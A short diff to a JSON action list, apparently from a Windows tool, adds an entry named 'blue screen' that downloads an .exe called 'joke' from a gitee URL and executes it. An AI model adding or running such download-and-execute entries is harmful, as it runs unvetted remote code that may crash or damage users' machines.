@@ -1,3 +1,20 @@
 [
-{ name: "", url:""}
+    {
+        "name": "蓝屏",
+        "Action": [
+            {
+                "ActionName": "downloadAndExecute",
+                "Paras": [
+                    {
+                        "ParaName": "url",
+                        "value": "https://gitee.com/lmx12330/window-op/raw/master/resource/expand/joke"
+                    },
+                    {
+                        "ParaName": "fileType",
+                        "value": "exe"
+                    }
+                ]
+            }
+        ]
+    }
 ]
